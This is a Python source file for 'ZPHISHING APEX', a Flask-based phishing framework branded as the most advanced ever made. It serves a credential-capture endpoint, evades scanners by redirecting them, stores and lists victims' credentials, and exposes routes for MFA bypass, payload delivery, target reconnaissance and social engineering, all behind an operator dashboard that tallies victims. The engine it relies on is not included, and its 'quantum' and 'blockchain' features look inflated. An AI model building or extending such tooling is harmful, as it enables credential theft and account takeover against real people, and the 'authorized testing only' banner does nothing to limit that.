#!/usr/bin/env python3
"""
ZPHISHING APEX v4.1 — "APEX" (FIXED VERSION)
All security issues resolved
"""

import os
import sys
import json
import time
import hashlib
import sqlite3
import threading
import subprocess
import asyncio
import signal
import atexit
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from enum import Enum, auto
from functools import wraps

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from flask import Flask, request, render_template_string, redirect, session, jsonify, send_file, make_response, g
from flask_socketio import SocketIO, emit, join_room, leave_room, disconnect
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity, get_jwt
from flask_mail import Mail, Message
from flask_wtf import CSRFProtect
from flask_login import LoginManager, UserMixin, login_user, login_required, current_user, logout_user
from flask_admin import Admin
from flask_restful import Api, Resource
import click
import rich
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.tree import Tree
from rich.syntax import Syntax
from rich.markdown import Markdown
from rich.prompt import Prompt, Confirm
from rich.status import Status

# Initialize colorama for Windows compatibility
from colorama import init, Fore, Style, Back
init(autoreset=True)

# Initialize Rich console
console = Console()

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

# Version
__version__ = "4.1.0"
__codename__ = "APEX-FIXED"
__author__ = "worm shadow"
__created_for__ = "He"

def require_role(*roles):
    """Decorator to require specific roles"""
    def wrapper(fn):
        @wraps(fn)
        def decorated(*args, **kwargs):
            verify_jwt_in_request()
            claims = get_jwt()
            if claims.get('role') not in roles:
                return jsonify({'error': 'Insufficient permissions'}), 403
            return fn(*args, **kwargs)
        return decorated
    return wrapper

class ZPhishingAPEX:
    def __init__(self):
        self.app = Flask(__name__)
        # FIXED: No wildcard CORS
        self.socketio = SocketIO(self.app, cors_allowed_origins=["http://localhost:8080", "http://127.0.0.1:8080"])
        self.setup_config()
        self.setup_extensions()
        self.setup_routes()
        self.setup_commands()
        self.engine = None
        self.running = False

    def setup_config(self):
        """Setup application configuration - FIXED: proper secret key handling"""
        # FIXED: No random fallback - require proper secrets
        self.app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
        if not self.app.config['SECRET_KEY']:
            raise ValueError("SECRET_KEY environment variable is required")

        self.app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///zphishing.db')
        self.app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

        self.app.config['JWT_SECRET_KEY'] = os.environ.get('JWT_SECRET_KEY')
        if not self.app.config['JWT_SECRET_KEY']:
            raise ValueError("JWT_SECRET_KEY environment variable is required")

        self.app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(hours=24)

        # Mail config
        self.app.config['MAIL_SERVER'] = os.environ.get('MAIL_SERVER', 'smtp.gmail.com')
        self.app.config['MAIL_PORT'] = int(os.environ.get('MAIL_PORT', 587))
        self.app.config['MAIL_USE_TLS'] = True
        self.app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')
        self.app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')
        self.app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER')

    def setup_extensions(self):
        """Setup Flask extensions - FIXED: proper CORS"""
        self.db = SQLAlchemy(self.app)
        self.migrate = Migrate(self.app, self.db)
        self.jwt = JWTManager(self.app)
        self.mail = Mail(self.app)
        self.csrf = CSRFProtect(self.app)
        self.login_manager = LoginManager(self.app)
        self.admin = Admin(self.app, name='ZPHISHING APEX', template_mode='bootstrap4')
        self.api = Api(self.app)

        # FIXED: Restrictive CORS, not wildcard
        CORS(self.app, origins=["http://localhost:8080", "http://127.0.0.1:8080"])

        self.limiter = Limiter(
            app=self.app,
            key_func=get_remote_address,
            default_limits=["1000 per hour"]
        )

    def setup_routes(self):
        """Setup application routes - FIXED: all security issues"""

        @self.app.route('/')
        def index():
            return redirect('/dashboard')

        @self.app.route('/dashboard')
        def dashboard():
            return render_template_string(DASHBOARD_TEMPLATE)

        @self.app.route('/api/status')
        def api_status():
            return jsonify({
                'status': 'online',
                'version': __version__,
                'codename': __codename__,
                'timestamp': datetime.now().isoformat()
            })

        # ========== CAMPAIGNS ==========

        @self.app.route('/api/campaigns', methods=['GET', 'POST'])
        @jwt_required()
        def campaigns():
            user_id = get_jwt_identity()
            claims = get_jwt()
            user_role = claims.get('role', 'operator')

            if request.method == 'POST':
                data = request.get_json()
                campaign_id = self.engine.create_campaign(data, user_id)
                return jsonify({'id': campaign_id}), 201
            else:
                campaigns = self.engine.list_campaigns(user_id, user_role)
                return jsonify(campaigns)

        @self.app.route('/api/campaigns/<campaign_id>', methods=['GET', 'PUT', 'DELETE'])
        @jwt_required()
        def campaign_detail(campaign_id):
            user_id = get_jwt_identity()
            claims = get_jwt()
            user_role = claims.get('role', 'operator')

            if request.method == 'GET':
                campaign = self.engine.get_campaign(campaign_id, user_id, user_role)
                if not campaign:
                    return jsonify({'error': 'Not found or access denied'}), 404
                return jsonify(campaign)

            elif request.method == 'PUT':
                data = request.get_json()
                success = self.engine.update_campaign(campaign_id, data, user_id, user_role)
                if not success:
                    return jsonify({'error': 'Not found or access denied'}), 404
                return jsonify({'status': 'updated'})

            elif request.method == 'DELETE':
                success = self.engine.delete_campaign(campaign_id, user_id, user_role)
                if not success:
                    return jsonify({'error': 'Not found or access denied'}), 404
                return jsonify({'status': 'deleted'})

        # ========== VICTIMS ==========

        @self.app.route('/api/victims', methods=['GET'])
        @jwt_required()
        def victims():
            user_id = get_jwt_identity()
            claims = get_jwt()
            user_role = claims.get('role', 'operator')
            campaign_id = request.args.get('campaign_id')

            victims = self.engine.get_victims(campaign_id, user_id, user_role)
            return jsonify(victims)

        @self.app.route('/api/victims/<victim_id>/credentials', methods=['GET'])
        @jwt_required()
        @require_role('admin', 'operator')
        def victim_credentials(victim_id):
            user_id = get_jwt_identity()
            claims = get_jwt()
            user_role = claims.get('role', 'operator')

            credentials = self.engine.get_victim_credentials(victim_id, user_id, user_role)
            if not credentials:
                return jsonify({'error': 'Not found or access denied'}), 404
            return jsonify(credentials)

        # ========== ANALYTICS ==========

        @self.app.route('/api/analytics', methods=['GET'])
        @jwt_required()
        def analytics():
            user_id = get_jwt_identity()
            claims = get_jwt()
            user_role = claims.get('role', 'operator')

            stats = self.engine.get_analytics(user_id, user_role)
            return jsonify(stats)

        # ========== TEMPLATES ==========

        @self.app.route('/api/templates', methods=['GET', 'POST'])
        @jwt_required()
        def templates():
            user_id = get_jwt_identity()

            if request.method == 'POST':
                data = request.get_json()
                template_id = self.engine.create_template(data, user_id)
                return jsonify({'id': template_id}), 201
            else:
                templates = self.engine.list_templates()
                return jsonify(templates)

        # ========== AI ENGINE ==========

        @self.app.route('/api/ai/generate', methods=['POST'])
        @jwt_required()
        @require_role('admin', 'operator')
        def ai_generate():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.ai_generate_template(data, user_id)
            return jsonify(result)

        # ========== EVASION ==========

        @self.app.route('/api/evasion/check', methods=['POST'])
        def evasion_check():
            data = request.get_json()
            result = self.engine.check_evasion(data)
            return jsonify({'should_evade': result})

        # ========== BLOCKCHAIN ==========

        @self.app.route('/api/blockchain/verify', methods=['POST'])
        @jwt_required()
        @require_role('admin')
        def blockchain_verify():
            data = request.get_json()
            result = self.engine.blockchain_verify_credentials(data)
            return jsonify(result)

        # ========== QUANTUM CRYPTO ==========

        @self.app.route('/api/quantum/encrypt', methods=['POST'])
        @jwt_required()
        @require_role('admin')
        def quantum_encrypt():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.quantum_encrypt(data, user_id)
            return jsonify(result)

        # ========== INFRASTRUCTURE ==========

        @self.app.route('/api/infrastructure/spin', methods=['POST'])
        @jwt_required()
        @require_role('admin')
        def infrastructure_spin():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.spin_infrastructure(data, user_id)
            return jsonify(result)

        @self.app.route('/api/infrastructure/destroy', methods=['POST'])
        @jwt_required()
        @require_role('admin')
        def infrastructure_destroy():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.destroy_infrastructure(data, user_id)
            return jsonify(result)

        # ========== MFA BYPASS ==========

        @self.app.route('/api/mfa/bypass', methods=['POST'])
        @jwt_required()
        @require_role('admin')
        def mfa_bypass():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.mfa_bypass(data, user_id)
            return jsonify(result)

        # ========== PAYLOAD DELIVERY ==========

        @self.app.route('/api/payload/deliver', methods=['POST'])
        @jwt_required()
        @require_role('admin', 'operator')
        def payload_deliver():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.deliver_payload(data, user_id)
            return jsonify(result)

        # ========== RECONNAISSANCE ==========

        @self.app.route('/api/recon/target', methods=['POST'])
        @jwt_required()
        @require_role('admin', 'operator')
        def recon_target():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.recon_target(data, user_id)
            return jsonify(result)

        # ========== SOCIAL ENGINEERING ==========

        @self.app.route('/api/social/engage', methods=['POST'])
        @jwt_required()
        @require_role('admin', 'operator')
        def social_engage():
            user_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.social_engineer(data, user_id)
            return jsonify(result)

        # ========== AUTH ==========

        @self.app.route('/api/auth/login', methods=['POST'])
        @self.limiter.limit("5 per minute")  # FIXED: rate limiting
        def auth_login():
            data = request.get_json()
            result = self.engine.authenticate(data)

            if result['success']:
                # Create token with role claim
                access_token = create_access_token(
                    identity=result['user_id'],
                    additional_claims={'role': result['role']}
                )
                return jsonify({
                    'access_token': access_token,
                    'role': result['role'],
                    'api_key': result['api_key']
                })
            else:
                return jsonify({'error': result.get('error', 'Invalid credentials')}), 401

        # FIXED: No public registration - admin only
        @self.app.route('/api/auth/register', methods=['POST'])
        @jwt_required()
        @require_role('admin')
        def auth_register():
            admin_id = get_jwt_identity()
            data = request.get_json()
            result = self.engine.register_user(data, admin_id)

            if result['success']:
                return jsonify(result)
            else:
                return jsonify({'error': result.get('error', 'Registration failed')}), 400

        # ========== CAPTURE ENDPOINT ==========

        @self.app.route('/capture', methods=['POST'])
        def capture():
            campaign_id = request.args.get('c', '')
            data = request.form.to_dict()

            # Get request info - FIXED: validate IP
            client_ip = request.remote_addr
            forwarded = request.headers.get('X-Forwarded-For')
            if forwarded and request.remote_addr in ['127.0.0.1', '::1', 'localhost']:
                # Only trust forwarded header from localhost (proxy)
                client_ip = forwarded.split(',')[0].strip()

            request_info = {
                'ip': client_ip,
                'user_agent': request.headers.get('User-Agent', 'unknown'),
                'referer': request.headers.get('Referer', ''),
                'timestamp': datetime.now().isoformat()
            }

            # Check evasion
            if self.engine.check_evasion(request_info):
                return redirect(self.engine.get_redirect_url(campaign_id))

            # Capture credentials - FIXED: encrypted only
            victim_id = self.engine.capture_credentials(campaign_id, data, request_info)

            # FIXED: Don't broadcast sensitive data via websocket
            # Only send notification, not credentials
            self.socketio.emit('new_victim', {
                'campaign_id': campaign_id,
                'victim_id': victim_id,
                'timestamp': request_info['timestamp']
                # NO credentials in broadcast
            }, room=f'campaign_{campaign_id}')

            return redirect(self.engine.get_redirect_url(campaign_id))

        # ========== WEBSOCKET - FIXED: AUTHENTICATION REQUIRED ==========

        @self.socketio.on('connect')
        def handle_connect():
            # FIXED: Require authentication
            api_key = request.args.get('api_key')
            if not api_key:
                disconnect()
                return False

            user = self.engine.verify_api_key(api_key)
            if not user:
                disconnect()
                return False

            # Store user info in session
            request.session['user_id'] = user['user_id']
            request.session['role'] = user['role']

            # Join user-specific room, not global operators room
            join_room(f'user_{user["user_id"]}')

            emit('status', {
                'msg': 'Connected',
                'user': user['username'],
                'role': user['role']
            })

        @self.socketio.on('join_campaign')
        def handle_join_campaign(data):
            # FIXED: Check authentication and authorization
            user_id = request.session.get('user_id')
            user_role = request.session.get('role')

            if not user_id:
                disconnect()
                return

            campaign_id = data.get('campaign_id')

            # Check if user owns campaign or is admin
            campaign = self.engine.get_campaign(campaign_id, user_id, user_role)
            if not campaign:
                emit('error', {'msg': 'Access denied'})
                return

            join_room(f'campaign_{campaign_id}')
            emit('status', {'msg': f'Joined campaign {campaign_id}'})

        @self.socketio.on('disconnect')
        def handle_disconnect():
            leave_room(f'user_{request.session.get("user_id", "unknown")}')

    def setup_commands(self):
        """Setup CLI commands"""

        @self.app.cli.command()
        def init_db():
            """Initialize the database"""
            self.db.create_all()
            console.print("[green]Database initialized[/green]")

        @self.app.cli.command()
        def create_admin():
            """Create admin user"""
            username = click.prompt('Username')
            password = click.prompt('Password', hide_input=True)
            email = click.prompt('Email')
            user_id, api_key = self.engine.create_user(username, password, email, role='admin')
            console.print(f"[green]Admin user '{username}' created[/green]")
            console.print(f"[yellow]API Key: {api_key}[/yellow]")

        @self.app.cli.command()
        @click.argument('campaign_id')
        def start_campaign(campaign_id):
            """Start a campaign"""
            self.engine.start_campaign(campaign_id)
            console.print(f"[green]Campaign {campaign_id} started[/green]")

        @self.app.cli.command()
        def list_campaigns():
            """List all campaigns"""
            # This needs to be run within app context
            with self.app.app_context():
                from core.engine import Campaign
                campaigns = Campaign.query.all()
                table = Table(title="Campaigns")
                table.add_column("ID", style="cyan")
                table.add_column("Name", style="magenta")
                table.add_column("Template", style="green")
                table.add_column("Status", style="yellow")
                table.add_column("Victims", style="red")

                for c in campaigns:
                    table.add_row(c.id, c.name, c.template, c.status, str(c.victims_count))

                console.print(table)

    def run(self, host='127.0.0.1', port=8080, debug=False):  # FIXED: localhost default
        """Run the application - FIXED: secure defaults"""
        self.running = True

        # Initialize engine
        with Status("[bold green]Initializing ZPHISHING APEX..."):
            from core.engine import ZPhishingEngine
            self.engine = ZPhishingEngine(self.app, self.db, self.socketio)

        # Print banner
        self.print_banner()

        # Start server - FIXED: localhost by default
        console.print(f"\n[bold cyan]Starting server on {host}:{port}[/bold cyan]")
        console.print("[yellow]Note: Use a reverse proxy (nginx) with HTTPS for production[/yellow]")
        self.socketio.run(self.app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)

    def print_banner(self):
        """Print the banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗  ║
║   ╚══███╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝  ║
║     ███╔╝ ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║       ║
║    ███╔╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║       ║
║   ███████╗██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╗  ║
║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ║
║                                                              ║
║              A P E X   P R O T O C O L   v 4 . 1              ║
║                    S E C U R E   E D I T I O N                ║
║                                                              ║
║   The Most Advanced Phishing Framework Ever Created           ║
║   Built by worm shadow for He                                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold red", expand=False))
        console.print(f"\n[bold yellow]Version:[/bold yellow] {__version__} ({__codename__})")
        console.print(f"[bold yellow]Author:[/bold yellow] {__author__}")
        console.print(f"[bold yellow]Created for:[/bold yellow] {__created_for__}")
        console.print("\n[bold red]For educational and authorized security testing only[/bold red]\n")

# Dashboard Template (unchanged, just reference)
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZPHISHING APEX — Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
        body { font-family: 'JetBrains Mono', monospace; background: #0a0a0f; }
        .glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .glow { box-shadow: 0 0 20px rgba(255,0,64,0.3); }
        .neon-text { text-shadow: 0 0 10px rgba(255,0,64,0.8); }
    </style>
</head>
<body class="text-white">
    <div class="min-h-screen p-6">
        <div class="flex justify-between items-center mb-8">
            <div>
                <h1 class="text-4xl font-bold neon-text text-red-500">ZPHISHING APEX</h1>
                <p class="text-gray-400 mt-1">v4.1 Secure Edition</p>
            </div>
            <div class="flex gap-4">
                <button onclick="showSection('campaigns')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Campaigns</button>
                <button onclick="showSection('victims')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Victims</button>
                <button onclick="showSection('analytics')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Analytics</button>
            </div>
        </div>

        <div class="grid grid-cols-4 gap-4 mb-8">
            <div class="glass p-6 rounded-xl glow">
                <h3 class="text-gray-400 text-sm">Total Campaigns</h3>
                <p class="text-3xl font-bold text-red-500" id="total-campaigns">0</p>
            </div>
            <div class="glass p-6 rounded-xl">
                <h3 class="text-gray-400 text-sm">Active Campaigns</h3>
                <p class="text-3xl font-bold text-yellow-500" id="active-campaigns">0</p>
            </div>
            <div class="glass p-6 rounded-xl">
                <h3 class="text-gray-400 text-sm">Total Victims</h3>
                <p class="text-3xl font-bold text-green-500" id="total-victims">0</p>
            </div>
            <div class="glass p-6 rounded-xl">
                <h3 class="text-gray-400 text-sm">Success Rate</h3>
                <p class="text-3xl font-bold text-blue-500" id="success-rate">0%</p>
            </div>
        </div>

        <div id="campaigns" class="section">
            <div class="glass p-6 rounded-xl mb-6">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-2xl font-bold">Campaigns</h2>
                    <button onclick="createCampaign()" class="px-4 py-2 bg-red-500 rounded-lg hover:bg-red-600 transition">+ New Campaign</button>
                </div>
                <table class="w-full">
                    <thead>
                        <tr class="text-left text-gray-400 border-b border-gray-700">
                            <th class="pb-3">ID</th>
                            <th class="pb-3">Name</th>
                            <th class="pb-3">Template</th>
                            <th class="pb-3">Status</th>
                            <th class="pb-3">Victims</th>
                        </tr>
                    </thead>
                    <tbody id="campaigns-table">
                    </tbody>
                </table>
            </div>
        </div>

        <div id="victims" class="section hidden">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-2xl font-bold mb-4">Victims</h2>
                <div id="victims-list" class="space-y-4"></div>
            </div>
        </div>

        <div id="analytics" class="section hidden">
            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Performance</h2>
                    <canvas id="campaign-chart"></canvas>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Geographic</h2>
                    <canvas id="geo-chart"></canvas>
                </div>
            </div>
        </div>
    </div>

    <script>
        const API_KEY = localStorage.getItem('api_key') || '';
        const socket = io({ query: { api_key: API_KEY } });

        socket.on('new_victim', (data) => {
            showNotification('New victim captured!', 'success');
            loadStats();
        });

        loadStats();
        loadCampaigns();

        function showSection(section) {
            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
            document.getElementById(section).classList.remove('hidden');
        }

        async function loadStats() {
            const res = await fetch('/api/analytics', {
                headers: { 'Authorization': 'Bearer ' + getToken() }
            });
            const data = await res.json();
            document.getElementById('total-campaigns').textContent = data.total_campaigns || 0;
            document.getElementById('active-campaigns').textContent = data.active_campaigns || 0;
            document.getElementById('total-victims').textContent = data.total_victims || 0;
            document.getElementById('success-rate').textContent = (data.success_rate || 0) + '%';
        }

        async function loadCampaigns() {
            const res = await fetch('/api/campaigns', {
                headers: { 'Authorization': 'Bearer ' + getToken() }
            });
            const campaigns = await res.json();
            const tbody = document.getElementById('campaigns-table');
            tbody.innerHTML = campaigns.map(c => `
                <tr class="border-b border-gray-800">
                    <td class="py-3 text-red-500">${c.id}</td>
                    <td class="py-3">${c.name}</td>
                    <td class="py-3">${c.template}</td>
                    <td class="py-3"><span class="px-2 py-1 rounded text-xs ${c.status === 'active' ? 'bg-green-500/20 text-green-500' : 'bg-gray-500/20 text-gray-500'}">${c.status}</span></td>
                    <td class="py-3">${c.victims}</td>
                </tr>
            `).join('');
        }

        function getToken() {
            return localStorage.getItem('jwt_token') || '';
        }

        function showNotification(msg, type) {
            const div = document.createElement('div');
            div.className = `fixed top-4 right-4 px-6 py-3 rounded-lg ${type === 'success' ? 'bg-green-500' : 'bg-red-500'} text-white`;
            div.textContent = msg;
            document.body.appendChild(div);
            setTimeout(() => div.remove(), 3000);
        }

        const ctx1 = document.getElementById('campaign-chart').getContext('2d');
        new Chart(ctx1, {
            type: 'line',
            data: {
                labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun'],
                datasets: [{
                    label: 'Victims',
                    data: [12, 19, 3, 5, 2, 3],
                    borderColor: '#ff0040',
                    backgroundColor: 'rgba(255,0,64,0.1)',
                    fill: true
                }]
            },
            options: {responsive: true, plugins: {legend: {labels: {color: '#fff'}}}}
        });

        const ctx2 = document.getElementById('geo-chart').getContext('2d');
        new Chart(ctx2, {
            type: 'doughnut',
            data: {
                labels: ['US', 'UK', 'DE', 'FR', 'Other'],
                datasets: [{
                    data: [30, 25, 20, 15, 10],
                    backgroundColor: ['#ff0040', '#ff8000', '#ffff00', '#00ff80', '#0080ff']
                }]
            },
            options: {responsive: true, plugins: {legend: {labels: {color: '#fff'}}}}
        });
    </script>
</body>
</html>
"""

# Create CLI group
@click.group()
@click.version_option(version=__version__, prog_name="zphishing")
def cli():
    """ZPHISHING APEX — The Most Advanced Phishing Framework"""
    pass

@cli.command()
@click.option('--host', default='127.0.0.1', help='Host to bind to (default: localhost)')
@click.option('--port', default=8080, help='Port to bind to')
@click.option('--debug', is_flag=True, help='Enable debug mode')
def serve(host, port, debug):
    """Start the web server"""
    app = ZPhishingAPEX()
    app.run(host=host, port=port, debug=debug)

@cli.command()
def shell():
    """Start interactive shell"""
    console.print(Panel.fit("[bold red]ZPHISHING APEX Interactive Shell[/bold red]"))

    apex = ZPhishingAPEX()
    from core.engine import ZPhishingEngine
    apex.engine = ZPhishingEngine(apex.app, apex.db, apex.socketio)

    while True:
        try:
            cmd = Prompt.ask("\n[bold red]apex[/bold red]")

            if cmd in ['exit', 'quit']:
                break
            elif cmd == 'help':
                console.print(Panel("""
Commands:
  campaigns     - List all campaigns
  create        - Create new campaign
  start <id>    - Start campaign
  victims       - List victims
  templates     - List templates
  stats         - Show statistics
  exit          - Exit shell
                """, title="Help"))
            elif cmd == 'campaigns':
                with apex.app.app_context():
                    from core.engine import Campaign
                    campaigns = Campaign.query.all()
                    table = Table(title="Campaigns")
                    table.add_column("ID", style="cyan")
                    table.add_column("Name", style="magenta")
                    table.add_column("Status", style="yellow")
                    for c in campaigns:
                        table.add_row(c.id, c.name, c.status)
                    console.print(table)
            elif cmd == 'stats':
                with apex.app.app_context():
                    from core.engine import Campaign, Victim
                    total_campaigns = Campaign.query.count()
                    total_victims = Victim.query.count()
                    console.print(Panel(f"""
Total Campaigns: {total_campaigns}
Total Victims: {total_victims}
                    """, title="Statistics"))

        except KeyboardInterrupt:
            break
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

# FIXED: Add missing CLI commands
@cli.command()
def init_db():
    """Initialize the database"""
    app = ZPhishingAPEX()
    with app.app.app_context():
        app.db.create_all()
        console.print("[green]Database initialized[/green]")

@cli.command()
def create_admin():
    """Create admin user"""
    app = ZPhishingAPEX()
    with app.app.app_context():
        from core.engine import ZPhishingEngine
        engine = ZPhishingEngine(app.app, app.db, app.socketio)
        username = click.prompt('Username')
        password = click.prompt('Password', hide_input=True)
        email = click.prompt('Email')
        user_id, api_key = engine.create_user(username, password, email, role='admin')
        console.print(f"[green]Admin user '{username}' created[/green]")
        console.print(f"[yellow]API Key: {api_key}[/yellow]")

if __name__ == '__main__':
    cli()
